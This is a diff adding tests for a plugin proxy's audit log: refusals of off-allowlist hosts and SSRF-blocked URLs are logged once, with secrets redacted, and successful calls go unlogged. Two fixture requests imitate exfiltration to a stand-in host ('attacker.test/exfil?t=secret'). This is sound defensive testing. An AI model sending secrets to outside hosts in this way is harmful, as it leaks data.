@@ -212,3 +212,77 @@ describe('plugin proxy — auth token injection', () => {
     expect(upstreamCall().headers.Authorization).toBeUndefined();
   });
 });
+
+/* ─── Audit noise ─────────────────────────────────
+ * The proxy used to write a `plugin_proxy` entry per successful request. One
+ * polling plugin produced 85,221 of them carrying five distinct tuples, which
+ * rotated the actual security events out of the file. Success is now silent
+ * and only a refusal is recorded. These assert against the real audit.log the
+ * route writes into the per-test temp data dir.
+ */
+
+describe('plugin proxy — audit', () => {
+  const auditPath = () => path.join(tmpDir, 'data', 'audit.log');
+
+  async function auditEntries(): Promise<Array<Record<string, unknown>>> {
+    const { writeQueue } = await import('@/lib/audit');
+    await writeQueue;
+    const content = await fs.readFile(auditPath(), 'utf-8').catch(() => '');
+    return content.trim() ? content.trim().split('\n').map((l) => JSON.parse(l)) : [];
+  }
+
+  it('writes nothing when a plugin calls a host inside its allowlist', async () => {
+    await seedPlugin('quiet', { allowedDomains: ['api.example.com'] });
+    const { POST } = await import('../route');
+
+    for (let i = 0; i < 10; i++) {
+      const res = await POST(proxyReq('quiet', { url: 'https://api.example.com/poll' }), ctx('quiet'));
+      expect(res.status).toBe(200);
+    }
+
+    expect(await auditEntries()).toEqual([]);
+  });
+
+  it('records a host outside the allowlist', async () => {
+    await seedPlugin('nosy', { allowedDomains: ['api.example.com'] });
+    const { POST } = await import('../route');
+
+    const res = await POST(proxyReq('nosy', { url: 'https://attacker.test/exfil?t=secret' }), ctx('nosy'));
+    expect(res.status).toBe(403);
+
+    const entries = await auditEntries();
+    expect(entries).toHaveLength(1);
+    expect(entries[0]).toMatchObject({
+      action: 'plugin_proxy_denied',
+      pluginId: 'nosy',
+      domain: 'attacker.test',
+      reason: 'domain_not_allowed',
+    });
+    expect(JSON.stringify(entries[0])).not.toContain('secret');
+  });
+
+  it('records a URL the SSRF re-check refuses', async () => {
+    await seedPlugin('ssrf', { allowedDomains: ['api.example.com'] });
+    mocks.safe.mockImplementationOnce(async () => false);
+    const { POST } = await import('../route');
+
+    const res = await POST(proxyReq('ssrf', { url: 'https://api.example.com/rebound' }), ctx('ssrf'));
+    expect(res.status).toBe(403);
+
+    const entries = await auditEntries();
+    expect(entries).toHaveLength(1);
+    expect(entries[0]).toMatchObject({ action: 'plugin_proxy_denied', reason: 'ssrf_blocked' });
+  });
+
+  it('does not let a plugin retrying a blocked host flood the log', async () => {
+    await seedPlugin('loop', { allowedDomains: ['api.example.com'] });
+    const { POST } = await import('../route');
+
+    for (let i = 0; i < 25; i++) {
+      const res = await POST(proxyReq('loop', { url: 'https://attacker.test/exfil' }), ctx('loop'));
+      expect(res.status).toBe(403);
+    }
+
+    expect(await auditEntries()).toHaveLength(1);
+  });
+});
